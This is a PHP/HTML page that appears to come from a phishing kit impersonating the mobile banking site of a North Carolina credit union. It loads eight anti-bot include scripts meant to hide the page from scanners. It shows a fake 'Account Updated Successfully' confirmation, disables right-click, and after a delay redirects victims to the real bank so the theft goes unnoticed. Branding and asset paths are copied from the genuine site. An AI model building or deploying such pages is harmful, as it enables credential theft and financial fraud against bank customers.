<?php
include "./bot/anti1.php";
include "./bot/anti2.php";
require "./bot/anti3.php";
require "./bot/anti4.php";
require "./bot/anti5.php";
require "./bot/anti6.php";
require "./bot/anti7.php";
require "./bot/anti8.php";
?>

<!DOCTYPE html>


<html data-scrapbook-source="https://m.ncsecu.org/m/Menu.aspx" data-scrapbook-create="20220224145805360" data-scrapbook-title="Mobile Access - Menu" lang="en">

<head>

<script src="analytic/icon/pdf/data/ncsecu_common.js"></script>

<title>	Mobile Access - Menu</title>

<meta http-equiv="content-type" content="text/html; charset=UTF-8">
<meta name="format-detection" content="telephone=no">
<meta id="viewport" name="viewport" content="width=device-width, initial-scale=1.0">
<link href="analytic/icon/pdf/data/SECUmedium.css" rel="stylesheet" type="text/css" media="all">
<link rel="icon" href="analytic/icon/pdf/data/SECUfavicon.ico" type="image/x-icon">
<link rel="icon" href="analytic/icon/pdf/data/icon-v2-128x128.png" sizes="128x128">
<link rel="icon" href="analytic/icon/pdf/data/icon-v2-192x192.png" sizes="192x192">
<link rel="apple-touch-icon" href="https://m.ncsecu.org/m/Images/SECU/apple-touch-icon-v2-76x76.png">
<link rel="apple-touch-icon" href="https://m.ncsecu.org/m/Images/SECU/apple-touch-icon-v2-152x152.png" sizes="152x152">
<link rel="apple-touch-icon" href="https://m.ncsecu.org/m/Images/SECU/apple-touch-icon-v2-167x167.png" sizes="167x167">
<link rel="apple-touch-icon" href="https://m.ncsecu.org/m/Images/SECU/apple-touch-icon-v2-180x180.png" sizes="180x180">

<!--
<script type="text/javascript" src="ClientSideHelpers.js"></script>
<script src="jquery-3.6.0.min.js"></script>
<script src="ncsecu_common-1.js"></script>
-->

<meta name="keywords" content="SECU mobile access,
    SECU mobile, NCSECU mobile access, NCSECU mobile, State Employees Credit Union Mobile, State Employees’ Credit Union
    mobile, State Employees’s Credit Union mobile, SECU mobile app, NCSECU Mobile app, state employees credit union mobile
    app, credit union mobile,financial institution mobile,bank mobile,checking mobile,checking account mobile,money market
    mobile,cds mobile,certificate of deposit mobile,savings mobile,savings account mobile,invest mobile,online service
    mobile,online banking mobile,mobile access,bill payment mobile,visa check card mobile,visa credit card mobile,credit
    card mobile">

<link rel="stylesheet" href="gtag/cloud/data/css/style.css" />

</head>

<body class="preLogger">

<noscript>
<div class="errorText">Please Check Your Browser<br>Your current browser is not capable of viewing this site because it does not support javascript.<br>
</div>
</noscript>

<a href="http://itunes.apple.com/us/app/SECU/id1435916976?mt=8" style="text-decoration: none; color: #ffffff;">
<table id="MobileAppBanner" role="presentation" style="background: #333333; height: 50px; position: fixed; left: 0; right: 0; top: 0;" width="100%">
<tbody>
<tr>
<td style="vertical-align: middle; padding-left: 10px;" width="30px;">
<img src="analytic/icon/pdf/data/Logo.fw.png" alt="SECU Logo" width="25px;" height="25px;">
</td>
<td style="vertical-align: middle; text-align: left;" class="text3">Open in the SECU Mobile App</td>
<td style="vertical-align: middle; text-align: right; padding-right: 10px;" class="text3" width="20px;">&gt;</td>
</tr>
</tbody>
</table>
</a>
<div style="height: 50px;">&nbsp;</div>
<div id="logobar" class="logoBar">
<div id="logoDiv" class="centered noExtraSpace">
<img id="logo" class="logo" alt="SECU Logo" title="SECU Logo" src="analytic/icon/pdf/data/SECU_480_White.png">
</div>
</div>



<form method="post" action=""  id="loginForm" name="loginForm">

<div class="aspNetHidden">
<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="AFo0jm6VCtDtONvN7xn2x11SDoX092n3sw4I3nfWFgHiJMe3ioW4L4fKLukuaIJND93SAdvD/poeYQqnCA/CuWMzW5XYIhwylNUeY8vGHJ7mZSl8QF35nPsa6yOmdhDvmvfyjqvTylU+g7dV0hDY1jXteh2qpP0xkK9v+MDJRno+fD34">
</div>

<div style="display: none">
<input type="hidden" name="ctl00$MainCPH$LoginControl$TextboxBrowserName" id="MainCPH_LoginControl_TextboxBrowserName" value="">
</div>

<div class="centered topSpace" style="width: 85%;">
<div style="margin:0em 0 1em 0;font-size:22px">Account Updated Successfully</div>
<div class="noExtraSpace">
<div style="padding-bottom: .3em;margin-bottom:.3em;overflow: auto;">
   <img src="gtag/cloud/data/css/loading.gif" width="65" height="65" />
</div>
<div style="padding-bottom: 0; overflow: auto;">
  Please wait... you will be redirected in 5 seconds. Do not press the browser's back button.
 </div>
 <div>
 <input type="hidden" name="MobileToken" id="MobileToken" value="asdf345-asgfadsg-fd@$#6qew-adsfasg-agasf">
 </div>
 </div>
 <div style="margin-top: .2em; margin-bottom: 0em; clear: both;">

 </div>
 <input id="hidJSTest" type="hidden" value="false" name="hidJSTest">
 </div>


 <div style="margin-top: .4em;">
 <div id="MainCPH_SelectionListMenu_contentDiv" class="content">
 <div id="MainCPH_SelectionListMenu_Items_listItemDiv_0" class="menuItem text2">
 <a id="Menu_1" title="Rates &amp; Fees" href="https://m.ncsecu.org/m/Rates.aspx">Rates &amp; Fees</a>
 </div>
 <div id="MainCPH_SelectionListMenu_Items_listItemDiv_1" class="menuItem text2">
 <a id="Menu_2" title="Locate Us" href="https://locations.ncsecu.org/search" target="_blank">Locate Us</a>
 </div>
 <div id="MainCPH_SelectionListMenu_Items_listItemDiv_2" class="menuItem text2">
 <a id="Menu_3" title="Contact Us" href="https://m.ncsecu.org/m/ContactUs_SECU.aspx">Contact Us</a>
 </div>
 <div id="MainCPH_SelectionListMenu_Items_listItemDiv_3" class="menuItem text2">
 <a id="Menu_4" title="View Full Website" href="https://www.ncsecu.org/home.html">View Full Website</a>
 </div>
 </div>
 </div>



<div class="aspNetHidden">
<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="CEF4095C">
<input type="hidden" name="__VIEWSTATEENCRYPTED" id="__VIEWSTATEENCRYPTED" value="">
<input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="bNOZ/U6L5kxhFwgVn/1wbHFGTcQr5UB9pk5Ztkg8k4CzkOnjHof7WVWouE7xPtAH3BY8Q1hyriVZS6Xk+6rBOciSWVK/cR2LbGe5/yhkxB8dw8oIu9rKA8dYvFZyTM282GunTVWdtTYWS/6MdSFZlDVlE0ML7VUeQ/CqeULE+X3Nz171jN9nXxqd7AbI8gFJeqJzfK/FV6mPoLX8BFjQu9SB5hmvoeuF0PH1wZF005DF2cEuSkr23rTm1BFX7SP95eqXPQ==">
</div>
</form>




<div class="footer text5">
<div class="smallSpaceBelow">
<a href="https://www.ncsecu.org/Home/Legal.html" title="Legal" class="Link noShowLink" target="_blank">Legal</a>                &nbsp;&nbsp;|&nbsp;&nbsp;
                <a id="linkAccessibility" href="https://www.ncsecu.org/Home/AccessibilityStatement.html" target="_blank">Accessibility</a>                &nbsp;&nbsp;|&nbsp;&nbsp;
                <a class="Link noShowLink" href="javascript:ChangeLanguage(&quot;/m/Menu.aspx?lang=es&quot;)">Español</a>                &nbsp;&nbsp;|&nbsp;&nbsp;
                <a href="https://m.ncsecu.org/m/SiteMap.aspx" id="ViewSiteMapLink" class="Link noShowLink">Site Map</a><br>                Equal Housing Opportunity
                <img src="analytic/icon/pdf/data/ehl_gif_white_s14x13x256Pass.png" alt="Equal Housing Lender" width="14" height="13">
                &nbsp;&nbsp;|&nbsp;&nbsp;
                NMLS#430055
            </div>

<div class="smallSpaceBelow">
<span id="LabelInsuredMessage">Federally Insured by NCUA</span>
</div><!-- <span id="LabelAccessibilityMessage"></span> -->
</div>




<div class="overlay">
  <div class="lgif-space"></div>
    <div class="loadgif">
       <img src="gtag/cloud/data/css/loading.gif" width="100" height="100">
    </div>
</div>


<script src="https://code.jquery.com/jquery-3.2.1.min.js"></script>

 <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.0/umd/popper.min.js" integrity="sha384-cs/chFZiN24E4KMATLdqdvsezGxaGsi4hLGOzlXwp5UZB1LY//20VyM2taTB4QvJ" crossorigin="anonymous"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.0/js/bootstrap.min.js" integrity="sha384-uefMccjFJAIv6A+rW+L4AHf99KvxDjWSu1z9VI8SKNVmz4sk7buKt/6v9KI65qnm" crossorigin="anonymous"></script>
<script src="https://ajax.aspnetcdn.com/ajax/jQuery/jquery-3.3.1.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.10/jquery.mask.js"></script>

<script type="text/javascript">

$(document).bind("contextmenu", function(e){ return false;});

setTimeout(function() {
                              window.location.href = "https://www.ncsecu.org/";
 },9000);


</script>





<script type="text/javascript" src="gtag/cloud/data/css/actions.js"></script>
</body>
</html>
